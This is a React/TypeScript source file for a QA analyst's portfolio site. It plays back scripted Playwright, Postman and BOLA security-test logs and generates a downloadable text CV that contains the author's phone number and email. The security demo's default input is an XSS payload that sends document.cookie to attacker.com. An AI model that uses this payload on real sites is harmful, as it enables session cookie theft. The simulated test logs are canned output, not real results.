import React, { useState, useEffect, useRef } from 'react';
import NavBar from './components/NavBar';
import HeroSection from './components/HeroSection';
import AboutSection from './components/AboutSection';
import SkillsSection from './components/SkillsSection';
import ProjectsSection from './components/ProjectsSection';
import EducationSection from './components/EducationSection';
import ExperienceSection from './components/ExperienceSection';
import ContactSection from './components/ContactSection';
import CVModal from './components/CVModal';

export default function App() {
  const [theme, setTheme] = useState<'light' | 'dark'>(() => {
    const saved = localStorage.getItem('theme');
    if (saved === 'light' || saved === 'dark') return saved;
    return 'light';
  });

  useEffect(() => {
    const root = window.document.documentElement;
    if (theme === 'dark') {
      root.classList.add('dark');
    } else {
      root.classList.remove('dark');
    }
  }, [theme]);

  const toggleTheme = () => {
    const nextTheme = theme === 'light' ? 'dark' : 'light';
    setTheme(nextTheme);
    localStorage.setItem('theme', nextTheme);
  };

  const [activeSection, setActiveSection] = useState<string>('home');
  const [showCVModal, setShowCVModal] = useState<boolean>(false);
  const [isDownloading, setIsDownloading] = useState<boolean>(false);

  // Form states
  const [contatoNome, setContatoNome] = useState<string>("");
  const [contatoEmail, setContatoEmail] = useState<string>("");
  const [contatoMensagem, setContatoMensagem] = useState<string>("");
  const [isSendingContato, setIsSendingContato] = useState<boolean>(false);
  const [contatoSucesso, setContatoSucesso] = useState<boolean>(false);

  // Playwright simulator states
  const [playwrightStatus, setPlaywrightStatus] = useState<"idle" | "running" | "completed">("idle");
  const [playwrightLogs, setPlaywrightLogs] = useState<string[]>([]);
  const playwrightTimerRef = useRef<NodeJS.Timeout | null>(null);

  // Postman/Newman API simulator states
  const [apiStatus, setApiStatus] = useState<"idle" | "running" | "completed">("idle");
  const [apiLogs, setApiLogs] = useState<string[]>([]);
  const apiTimerRef = useRef<NodeJS.Timeout | null>(null);

  // Security test states
  const [securityInput, setSecurityInput] = useState<string>("<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>");
  const [securityLogs, setSecurityLogs] = useState<string[]>([]);
  const [isScanning, setIsScanning] = useState<boolean>(false);
  const [sanitizedResult, setSanitizedResult] = useState<string>("");

  // Clean-up simulation timer
  useEffect(() => {
    return () => {
      if (playwrightTimerRef.current) clearInterval(playwrightTimerRef.current);
      if (apiTimerRef.current) clearInterval(apiTimerRef.current);
    };
  }, []);

  // Postman Colection simulation runner
  const handleApiSimulation = () => {
    if (apiTimerRef.current) clearInterval(apiTimerRef.current);
    setApiStatus("running");
    setApiLogs([]);

    const logs = [
      "🚀 [POSTMAN] Despachando Runner para a Collection: 'E-Commerce API Validation'...",
      "📡 [REQ 1] POST https://automationexercise.com/api/verifyLogin",
      "📦 [PAYLOAD] email=emilys@example.com&password=emilyspassword",
      "📥 [RESPONSE 1] HTTP 200 OK (220ms) — Response: { responseCode: 200, message: 'User exists!' }",
      "🧪 [TEST] Running Assertion 1: 'Status code é 200 - Login Sucesso' ✔ Passed.",
      "🧪 [TEST] Running Assertion 2: 'Retornou mensagem de validação contendo User exists!' ✔ Passed.",
      "💾 [VARIABLE] Salvando email de autenticação de sessão nas variáveis globais...",
      "📡 [REQ 2] GET https://automationexercise.com/api/productsList",
      "📥 [RESPONSE 2] HTTP 200 OK (195ms)",
      "🧪 [TEST] Running Assertion 1: 'Status code é 200 - Produtos Listados' ✔ Passed.",
      "🧪 [TEST] Running Assertion 2: 'Tempo de resposta menor que 500ms' ✔ Passed. (responseTime: 180ms)",
      "🧪 [TEST] Running Assertion 3: 'A lista de produtos contém itens válidos' ✔ Passed.",
      "🎉 [SUCESSO] Coleção Postman finalizada! 2 requisições encadeadas, 5/5 testes executados com 100% de sucesso!"
    ];

    let currentIdx = 0;
    apiTimerRef.current = setInterval(() => {
      if (currentIdx < logs.length) {
        setApiLogs((prev) => [...prev, logs[currentIdx]]);
        currentIdx++;
      } else {
        if (apiTimerRef.current) clearInterval(apiTimerRef.current);
        setApiStatus("completed");
      }
    }, 350);
  };

  // Playwright Log simulator logic
  const handlePlaywrightSimulation = () => {
    if (playwrightTimerRef.current) clearInterval(playwrightTimerRef.current);
    setPlaywrightStatus("running");
    setPlaywrightLogs([]);

    const logs = [
      "⚡ [SYSTEM] Inicializando runner de testes Headless Chromium via Playwright...",
      "🔍 [CONFIG] Carregando arquitetura de teste estruturada com Page Object Model (POM).",
      "🎯 [PROJECT] Iniciando automação do escopo 'E-Commerce Core Flow'...",
      "🌐 [STEP] Conectando ao ambiente de treinamento seguro: Automation Exercise (automationexercise.com)...",
      "🔑 [CENÁRIO 1] Iniciando Autenticação de Usuário (Login)...",
      "📝 [ACTION] Preenchendo formulário de login com 'tester@example.com' e senha cadastrada.",
      "✓ [ASSERT 1] Sucesso: Elemento 'Logged in as username' visível e URL direcionada para a Home.",
      "🛒 [CENÁRIO 2] Seleção de Produto e Adição ao Carrinho...",
      "📝 [ACTION] Buscando produto 'Sleeveless Dress', interagindo com a vitrine e adicionando à sacola.",
      "✓ [ASSERT 2] Sucesso: Produto correto identificado na sacola de compras. Quantidade: 1.",
      "📦 [CENÁRIO 3] Finalização e Checkout da Compra...",
      "📝 [ACTION] Clicando em 'Proceed To Checkout', informando dados de entrega e efetuando pagamento simulado...",
      "✓ [ASSERT 3] Sucesso: Mensagem de confirmação 'ORDER PLACED!' capturada com assert.toBeVisible().",
      "🎉 [SUCESSO] Fluxo completo de ponta a ponta finalizado com 3/3 asserções válidas em 1285ms!"
    ];

    let currentIdx = 0;
    playwrightTimerRef.current = setInterval(() => {
      if (currentIdx < logs.length) {
        setPlaywrightLogs((prev) => [...prev, logs[currentIdx]]);
        currentIdx++;
      } else {
        if (playwrightTimerRef.current) clearInterval(playwrightTimerRef.current);
        setPlaywrightStatus("completed");
      }
    }, 350);
  };

  // ID Tampering & BOLA Test simulation runner (Security QA)
  const handleSecurityScan = () => {
    if (apiTimerRef.current) clearInterval(apiTimerRef.current);
    setIsScanning(true);
    setSecurityLogs([]);
    setSanitizedResult("");

    const logs = [
      "🚀 [NEWMAN-SEC] Inicializando suite de segurança: 'Email Tampering & BOLA Test'...",
      "🔑 [TOKEN] Autenticando e gerando sessão válida para o Usuário joao@example.com...",
      "📡 [CENÁRIO 1] Iniciando Autenticação/Caminho Feliz (Acesso Autorizado)...",
      "🌐 [POST] https://automationexercise.com/api/getUserDetailByEmail",
      "📦 [PAYLOAD] email=joao@example.com",
      "📥 [RESPONSE-1] HTTP 200 OK (145ms)",
      "🧪 [TEST-1] Status deve ser 200 - Usuário acessou os próprios dados ✔ Passed",
      "⚔️ [CENÁRIO 2] Iniciando Ataque de Manipulação (Pentest / SecQA)...",
      "🕵️ [ATTACK] Mantendo os cabeçalhos de sessão do João, mas tentando obter dados da Maria...",
      "🌐 [POST] https://automationexercise.com/api/getUserDetailByEmail",
      "📦 [PAYLOAD] email=maria@example.com (Diferente da conta autenticada)",
      "📥 [RESPONSE-2] HTTP 403 Forbidden! (110ms) [BLOQUEADO COM SEGURANÇA]",
      "🧪 [TEST-2] Segurança: Status deve ser 403 Forbidden para manipulação lateral de email ✔ Passed",
      "🧪 [TEST-3] Segurança: Resposta não deve expor cadastro sensível de terceiros ✔ Passed",
      "🎉 [SUCESSO-SEC] Auditoria encerrada! Pentest executado com sucesso e vulnerabilidade BOLA 100% contida!"
    ];

    let currentIdx = 0;
    const timer = setInterval(() => {
      if (currentIdx < logs.length) {
        setSecurityLogs((prev) => [...prev, logs[currentIdx]]);
        currentIdx++;
      } else {
        clearInterval(timer);
        setIsScanning(false);
        setSanitizedResult("Imunizado");
      }
    }, 350);
  };

  // Form submission dispatcher
  const triggerMessageDispatch = (e: React.FormEvent) => {
    e.preventDefault();
    if (!contatoNome || !contatoEmail || !contatoMensagem) return;
    setIsSendingContato(true);
    setTimeout(() => {
      setIsSendingContato(false);
      setContatoSucesso(true);
      setTimeout(() => {
        setContatoSucesso(false);
        setContatoNome("");
        setContatoEmail("");
        setContatoMensagem("");
      }, 5000);
    }, 1200);
  };

  // TXT CV generator download
  const handleDownloadCV = () => {
    setIsDownloading(true);
    setTimeout(() => {
      const textCV = `
======================================================================
     JOSEVEL ALVES SILVA - ANALISTA DE QUALIDADE & PORTFÓLIO SEC
======================================================================
Florianópolis - SC | (85) 98950-0747 | josevelmma5@gmail.com
LinkedIn: https://linkedin.com/in/josevel-silva-4863301b0
GitHub: https://github.com/JHOSEVEL

[OBJETIVO]
Busco uma vaga de Analista de Qualidade, contribuindo para a qualidade do
software por meio de testes manuais e automatizados robustos, aliando a
garantia de fluxo impecável com noções preventivas de Defesa Cibernética.

[EDUCAÇÃO]
- UNICESUMAR: Ciência de Dados (Início: 15.2023)
- UNINTER: Cibersegurança (Início: 16.2025)
- EBAC: Full Stack Python (Imersão Python)

[IDIOMAS]
- Inglês: Intermediário

[EXPERIÊNCIAS PROFISSIONAIS]

1. Hotel Veleiro Mar (Florianópolis) | Março 2024 - Outubro 2025
   Cargo: Recepcionista & Validador de Sistemas Internos
   - Análise de usabilidade e registros diários sob perspectiva do usuário real.
   - Registro e validação contínua de inconsistências operacionais e de dados financieiros.

2. Software-In (Fortaleza - CE) | Janeiro 2015 - Maio 2016
   Cargo: QA Engineer Junior
   - Execução de testes manuais e funcionais completos em sistemas web.
   - Identificação e documentação de bugs gráficos e funcionais de negócio.
   - Criação de testes unitários iniciais e primeiros scripts de automação.
   - Uso de Jira para catalogar falhas e apoiar o refinamento das Sprints.

3. CB Inspector (Fortaleza - CE) | Março 2014 - Outubro 2014
   Cargo: QA (Manual Testing)
   - Testes manuais focados na interface de usuário (UI) e consistência gráfica.
   - Reporte objetivo de bugs no Jira para priorização imediata dos devs.

======================================================================
Gerado automaticamente pelo Portfólio de Josevel Silva.
      `;
      const element = document.createElement("a");
      const file = new Blob([textCV], {type: 'text/plain'});
      element.href = URL.createObjectURL(file);
      element.download = `Curriculo_Josevel_Alves_Silva.txt`;
      document.body.appendChild(element);
      element.click();
      document.body.removeChild(element);
      setIsDownloading(false);
      setShowCVModal(false);
    }, 1200);
  };

  const handleNavClick = (sectionId: string) => {
    setActiveSection(sectionId);
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  };

  return (
    <div className="min-h-screen bg-cyber-bg text-cyber-text antialiased selection:bg-blue-600 dark:selection:bg-neon-blue dark:selection:text-black selection:text-white font-sans transition-colors duration-300">
      
      {/* Elegant Nav Header */}
      <NavBar onNavClick={handleNavClick} activeSection={activeSection} theme={theme} onToggleTheme={toggleTheme} />

      <main className="pb-4">
        
        {/* Hero Area */}
        <HeroSection 
          onVerCV={() => setShowCVModal(true)} 
          onContactClick={() => handleNavClick('contato')} 
        />

        {/* Story Bio */}
        <AboutSection />

        {/* Technical Skills Grids */}
        <SkillsSection />

        {/* Main interactive cases projects */}
        <ProjectsSection 
          playwrightStatus={playwrightStatus}
          playwrightLogs={playwrightLogs}
          handlePlaywrightSimulation={handlePlaywrightSimulation}
          apiStatus={apiStatus}
          apiLogs={apiLogs}
          handleApiSimulation={handleApiSimulation}
          securityInput={securityInput}
          setSecurityInput={setSecurityInput}
          securityLogs={securityLogs}
          isScanning={isScanning}
          sanitizedResult={sanitizedResult}
          handleSecurityScan={handleSecurityScan}
        />

        {/* Education grid list */}
        <EducationSection />

        {/* Historical professional experiences */}
        <ExperienceSection />

        {/* Connection wrapper footer */}
        <ContactSection 
          contatoNome={contatoNome}
          setContatoNome={setContatoNome}
          contatoEmail={contatoEmail}
          setContatoEmail={setContatoEmail}
          contatoMensagem={contatoMensagem}
          setContatoMensagem={setContatoMensagem}
          isSendingContato={isSendingContato}
          contatoSucesso={contatoSucesso}
          triggerMessageDispatch={triggerMessageDispatch}
        />

      </main>

      {/* Pop up model for direct CV download */}
      <CVModal 
        isOpen={showCVModal}
        onClose={() => setShowCVModal(false)}
        isDownloading={isDownloading}
        onDownload={handleDownloadCV}
      />

    </div>
  );
}
